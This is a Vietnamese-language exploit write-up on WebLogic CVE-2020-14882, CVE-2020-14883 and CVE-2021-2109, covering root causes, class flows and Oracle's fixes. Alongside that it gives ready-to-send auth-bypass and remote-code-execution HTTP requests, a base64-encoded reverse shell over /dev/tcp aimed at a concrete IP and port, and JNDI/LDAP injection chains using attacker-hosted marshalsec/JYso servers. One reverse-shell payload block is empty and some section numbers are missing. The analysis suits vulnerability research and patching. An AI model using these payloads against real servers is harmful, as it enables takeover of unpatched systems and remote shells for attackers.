# CVE-2020-14882 / CVE-2020-14883 — WebLogic Console Auth Bypass + RCE

> **Tested on**: WebLogic 12.2.1.4.0 (build 1974621), JDK 1.8.0_451, no patches
> **Target**: `container-registry.oracle.com/middleware/weblogic:12.2.1.4`

---

## 1. CVE-2020-14882 — Authentication Bypass

### 1.1. Overview

| Field    | Value                                                              |
| -------- | ------------------------------------------------------------------ |
| Type     | Path Traversal / Authentication Bypass                             |
| CVSS     | 9.8 (Critical)                                                     |
| Affected | WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3, 12.2.1.4, 14.1.1.0       |
| Patched  | October 2020 CPU (Patch ID: 31961038)                              |

### 1.2. Source → Sink

```
Source: HTTP Request URL path
        GET /console/css/%252e%252e%252fconsole.portal

Sink:   SingleFileServlet.service() — renders console.portal without authentication
```

### 1.3. Root Cause

Double URL encoding bypass trên security-constraint trong `web.xml`.

**web.xml** định nghĩa static resource paths không cần auth:

```xml
<security-constraint>
    <web-resource-collection>
      <web-resource-name>css</web-resource-name>
      <url-pattern>/css/*</url-pattern>           <!-- không cần auth -->
    </web-resource-collection>
</security-constraint>

<security-constraint>
    <web-resource-collection>
      <web-resource-name>console</web-resource-name>
      <url-pattern>/</url-pattern>                <!-- cần Admin/Operator/Deployer/Monitor -->
    </web-resource-collection>
    <auth-constraint>
      <role-name>Admin</role-name>
      ...
    </auth-constraint>
</security-constraint>
```

**Luồng xử lý URL:**

```
Request URL:  /console/css/%252e%252e%252fconsole.portal
                            ↓
Lần decode 1 (container):  /console/css/%2e%2e%2fconsole.portal
                            ↓
Security check:  path matches /css/*  →  BYPASS (no auth needed)
                            ↓
Lần decode 2 (SingleFileServlet):  /console/css/../console.portal
                            ↓
Path normalize:  /console/console.portal  →  renders admin console
```

Security filter (`WebAppSecurity.checkAccess()`) kiểm tra path **sau lần decode 1**, thấy `/css/*` → không cần auth. Nhưng `SingleFileServlet` decode thêm lần 2, path trở thành `/../console.portal` → traverse ra khỏi `/css/` → truy cập console.

### 1.4. Class Flow

| # | Class                                                    | Method             | JAR                              | Vai trò                                            |
|---|----------------------------------------------------------|--------------------|----------------------------------|----------------------------------------------------|
| 1 | `weblogic.servlet.internal.ServletRequestImpl`           | `getRequestURI()`  | `com.oracle.weblogic.servlet.jar`| Parse URL, first decode `%25` → `%`                |
| 2 | `weblogic.servlet.security.internal.WebAppSecurity`      | `checkAccess()`    | `com.oracle.weblogic.servlet.jar`| Match URL pattern → security constraint            |
| 3 | `weblogic.servlet.security.internal.WebAppSecurityWLS`   | `getConstraint()`  | `com.oracle.weblogic.servlet.jar`| `/css/*` → no auth-constraint → pass               |
| 4 | `weblogic.servlet.internal.WebAppServletContext`         | `execute()`        | `com.oracle.weblogic.servlet.jar`| Dispatch tới servlet                               |
| 5 | `com.bea.netuix.servlets.manager.SingleFileServlet`      | `service()`        | `netuix_servlet.jar`             | Decode lần 2, normalize path → console.portal      |

### 1.5. Các path bypass đã biết

```
/console/css/%252e%252e%252fconsole.portal
/console/images/%252e%252e%252fconsole.portal
/console/common/%252e%252e%252fconsole.portal
/console/css/%25%32%65%25%32%65%25%32%66console.portal
/console/css/%252e%252e%252fconsolejndi.portal        (cho CVE-2021-2109)
```

Bất kỳ path nào match `/css/*`, `/images/*`, `/common/*` (static resource patterns không cần auth) đều bypass được.

### 1.6. Cách Fix (Oracle Patch)

Oracle fix bằng cách:

1. **Normalize URL trước khi check security**: decode và resolve `../` TRƯỚC khi match URL pattern → security constraint
2. **Block double-encoded characters**: Reject request chứa `%25` trong path (encoded `%`)
3. **Thêm validation** trong `SingleFileServlet`: kiểm tra path traversal trước khi serve

### 1.7. Hạn chế của Auth Bypass

CVE-2020-14882 **chỉ bypass servlet security-constraint** (web.xml), **không tạo authenticated session**:

- `request.getUserPrincipal()` = null
- `principals = []` (empty)
- Không có admin session → các chức năng cần MBean access sẽ fail với `NoAccessRuntimeException`
- **Đủ** để trigger HandleFactory (CVE-2020-14883)
- **Không đủ** để trigger MBean-dependent actions (ảnh hưởng CVE-2021-2109)

## 2. CVE-2020-14883 — Remote Code Execution (Post-Auth)

### 2.1. Overview

| Field    | Value                                                              |
| -------- | ------------------------------------------------------------------ |
| Type     | Remote Code Execution via unsafe class instantiation               |
| CVSS     | 7.2 (High) — requires admin access (hoặc chain CVE-2020-14882)    |
| Affected | WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3, 12.2.1.4, 14.1.1.0       |
| Patched  | October 2020 CPU                                                   |

### 2.2. Source → Sink

```
Source: HTTP parameter "handle" trong console.portal URL
        ?handle=com.example.ClassName("constructor-arg")

Sink:   HandleFactory.getHandle() → Class.forName() → Constructor.newInstance()
        → attacker-controlled class được instantiate với attacker-controlled argument
```

### 2.3. Root Cause

`HandleFactory.getHandle(String)` nhận chuỗi handle từ HTTP parameter, parse tên class và argument, rồi instantiate class bằng reflection **mà không validate class nào được phép**:

```java
// HandleFactory.getHandle() pseudocode
public static Handle getHandle(String handleString) {
    // Parse: "com.example.Foo("arg")" 
    //   → className = "com.example.Foo"
    //   → argument  = "arg"
    
    int parenIndex = handleString.indexOf('(');
    String className = handleString.substring(0, parenIndex);
    // substring(parenIndex+2, length-2) — strip ("...") delimiters
    String arg = handleString.substring(parenIndex + 2, handleString.length() - 2);
    
    Class<?> clazz = Class.forName(className);
    Constructor<?> ctor = clazz.getConstructor(String.class);
    return (Handle) ctor.newInstance(arg);  // ← RCE nếu constructor có side effect
}
```

Bất kỳ class nào:
- Có constructor nhận `String` parameter
- Constructor thực hiện dangerous operation (eval code, load remote resource, exec command)

→ Đều có thể bị weaponize.

### 2.4. Cách Fix (Oracle Patch)

Oracle fix bằng **whitelist** — `HandleFactory.getHandle()` chỉ cho phép instantiate các class thuộc package `com.bea.console.handles.*`. Mọi class ngoài whitelist bị reject.

### 3.2. Chain B — ShellSession (MVEL Expression Eval)

| # | Class | Method | JAR | Vai trò |
|---|-------|--------|-----|---------|
| 1 | `HandleFactory` | `getHandle()` | `console.jar` | Instantiate class từ handle param |

**Yêu cầu**: `coherence-rest.jar` phải có trong classpath. Không cần HTTP server bên ngoài.

**Payload — Reverse Shell:**

```http

```

> **Lưu ý URL encoding**: `&` trong URL phải encode thành `%26`, nếu không bị parse thành URL parameter separator.

**Payload — Command execution (không cần reverse shell):**

```http
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')") HTTP/1.1
```

**Ưu điểm**: Không cần HTTP server, self-contained trong 1 request.
**Nhược điểm**: `Runtime.exec(String)` tokenize bằng whitespace — command phức tạp cần dùng `String[]` overload. Cần `coherence-rest.jar` trong classpath (có sẵn trên WebLogic 12.2.1.x).

### 3.3. Lưu ý về Runtime.exec()

`Runtime.getRuntime().exec(String cmd)` **không phải shell** — không hiểu `|`, `>`, `>&`, `/dev/tcp/...`. Hai cách xử lý:

**Cách 1 — Dùng `String[]` (khuyên dùng cho ShellSession):**

```java
Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/IP/PORT 0>&1"})
```

**Cách 2 — Dùng `{cmd,arg}` brace format (cho tool JNDI):**

Khi tool chỉ nhận 1 string command (như JNDI-Injection-Exploit):

```bash
bash -c {echo,BASE64_ENCODED_CMD}|{base64,-d}|bash
```

`{echo,BASE64}|{base64,-d}|bash` không có space → `exec()` giữ nguyên 1 token cho `-c` → bash interpret brace expansion → decode → execute.

Ví dụ:

```bash
# Encode reverse shell
echo -n "bash -i >& /dev/tcp/13.228.171.119/18422 0>&1" | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMy4yMjguMTcxLjExOS8xODQyMiAwPiYx

# Command cho tool:
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMy4yMjguMTcxLjExOS8xODQyMiAwPiYx}|{base64,-d}|bash
```

## 4. CVE-2021-2109 — JNDI Injection (kết hợp CVE-2020-14882)

### 4.1. Overview

| Field    | Value                                                              |
| -------- | ------------------------------------------------------------------ |
| Type     | JNDI Injection via Admin Console JNDI Tree Browser                 |
| CVSS     | 7.2 (High) — requires authenticated admin access                   |
| Affected | WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3, 12.2.1.4, 14.1.1.0       |
| Patched  | January 2021 CPU                                                   |

### 4.2. Source → Sink

```
Source: HTTP parameter "JNDIBindingPortlethandle" trong consolejndi.portal
        ?JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle("ldap://ATTACKER;IP:1389/path;AdminServer")

Sink:   JNDIBindingAction.execute() → InitialContext.lookup() → LDAP/RMI federation
        → attacker LDAP server → deserialization hoặc remote class loading → RCE
```

### 4.3. Root Cause

`JNDIBindingAction.execute()` lấy JNDI context và binding name từ `JndiBindingHandle`, rồi gọi `InitialContext.lookup()` với giá trị do attacker kiểm soát:

```java
// JNDIBindingAction.execute()
JndiBindingHandle handle = (JndiBindingHandle) getHandleContext(form, request, "JNDIBinding");
String context = handle.getContext();    // component[0] — "ldap://192.168.0"
String binding = handle.getBinding();    // component[1] — "10:1389/path"
String server  = handle.getServer();     // component[2] — "AdminServer"

ServerMBean serverMBean = MBeanUtils.getAnyServerMBean(server);
Context namingContext = ConsoleUtils.initNamingContext(serverMBean);

if (context.length() > 0 && binding.length() > 0)
    context = context + ".";

Object result = namingContext.lookup(context + binding);
// → lookup("ldap://192.168.0.10:1389/path")  ← JNDI injection!
```

**Handle parsing trick**: `HandleImpl.getComponents()` split bằng `;`:

```
Input:  "ldap://192.168.0;10:1389/path;AdminServer"
Split:  ["ldap://192.168.0", "10:1389/path", "AdminServer"]

context = "ldap://192.168.0"  + "."  →  "ldap://192.168.0."
binding = "10:1389/path"
lookup("ldap://192.168.0.10:1389/path")  ← valid LDAP URL, IP reconstructed
```

Dấu `;` dùng để chia IP thành components, `JNDIBindingAction` tự nối lại bằng `.` → reconstruct IP gốc.

### 4.4. Cách Fix (Oracle Patch)

Oracle fix bằng cách validate `context` và `binding` trong `JNDIBindingAction`:
- Block JNDI URL schemes (`ldap://`, `rmi://`, `iiop://`) trong giá trị lookup
- Sanitize input trước khi gọi `InitialContext.lookup()`

### 4.5. JNDI Injection — 2 kiểu tấn công

#### 4.5.1. Kiểu 1: Remote Codebase (Reference)

```
Victim                         Attacker
  |  lookup("ldap://...")        |
  |  ──────────────────────────► |  LDAP Server
  |  Reference(factory, codebase)|
  |  ◄────────────────────────── |
  |  GET /Evil.class             |
  |  ──────────────────────────► |  HTTP Server
  |  class bytes                 |
  |  ◄────────────────────────── |
  |  new Evil() → static block  |
  |  → RCE                      |
```

**Yêu cầu**: `com.sun.jndi.ldap.object.trustURLCodebase=true` (mặc định `false` từ JDK 8u191)

#### 4.5.2. Kiểu 2: Deserialization (javaSerializedData)

```
Victim                         Attacker
  |  lookup("ldap://...")        |
  |  ──────────────────────────► |  LDAP Server
  |  javaSerializedData: [bytes] |
  |  ◄────────────────────────── |
  |  readObject(bytes) → gadget  |
  |  → RCE                      |
```

**Không cần `trustURLCodebase`**. Cần gadget chain trong classpath victim.

### 4.6. Kết hợp CVE-2020-14882 + CVE-2021-2109

Dùng auth bypass path cho `consolejndi.portal`:

```http
GET /console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle("ldap://ATTACKER_IP_PART;LAST_OCTET:1389/dc=a;AdminServer") HTTP/1.1
Host: TARGET:7001
```

**Hạn chế khi chain với CVE-2020-14882**:

CVE-2020-14882 chỉ bypass web.xml security constraint, **không tạo authenticated session**. Khi `consolejndi.portal` render:
- `JNDIBindingAction.execute()` gọi `MBeanUtils.getAnyServerMBean(server)` → cần MBean access
- `principals = []` → `NoAccessRuntimeException`

Tuy nhiên, `JNDIBindingAction` vẫn có thể chạy nếu:
- Server name trong handle khớp đúng server instance (e.g., `AdminServer`)
- MBean access cho read-only lookup được phép ở mức lower privilege
- Một số version/config không enforce MBean check cho JNDI lookup

### 4.7. LDAP URL — Vấn đề DN hợp lệ

LDAP path phải là DN (Distinguished Name) hợp lệ. Route phức tạp có `/` (ví dụ `/Basic/Command/xxx`) sẽ gây error 34:

```
InvalidNameException: [LDAP: error code 34 - Unable to parse 'Basic/M-LF-/Evil.class' as a DN]
```

**Fix**: Dùng `setRoute` (JYso) hoặc marshalsec:

```bash
# JYso — set route qua HTTP, dùng DN đơn giản trong handle
curl "http://ATTACKER:3456/setRoute=deserialization/CommonsBeanutils2/command/base64/BASE64CMD"
# Handle: ldap://IP_PART;LAST:1389/dc=a;AdminServer

# marshalsec — trả Reference cho mọi DN
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER:8888/#Evil" 1389
# Handle: ldap://IP_PART;LAST:1389/dc=a;AdminServer
```
